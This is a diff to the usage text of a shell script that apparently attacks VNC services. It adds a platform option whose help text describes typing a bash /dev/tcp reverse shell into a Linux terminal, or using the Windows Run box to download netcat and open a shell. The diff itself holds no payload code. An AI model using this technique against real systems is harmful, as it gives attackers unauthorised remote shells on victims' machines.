@@ -2,12 +2,15 @@
 
 echo 
 usage() { 
-echo "Usage: $0 --rhost=x.x.x.x [--rport=5900] [--lhost=x.x.x.x] [--rport=4444]";
+echo "Usage: $0 --rhost=x.x.x.x [--rport=5900] [--lhost=x.x.x.x] [--rport=4444] [--platform=linux-gui]";
 echo "";
 echo "[rhost] = Remote ip (required)";
 echo "[rport] = Remote port (default: 5900)";
 echo "[lhost] = Local host to bind default shell to (default: your external ip)";
 echo "[lport] = Local port to bind default shell to (default: 4444)";
+echo "[platform] = (default: linux-gui)";
+echo "             linux-gui: will work on default ubuntu etc (using alt+ctrl+t -> terminal -> single payload via bin/bash and /dev/tcp/..)";
+echo "             win7 will work on win7+ (using windows_key+r -> run -> cmd -> 2 payloads (one to dl netcat, one top open shell) )";
 echo "";
 exit 1;
 }
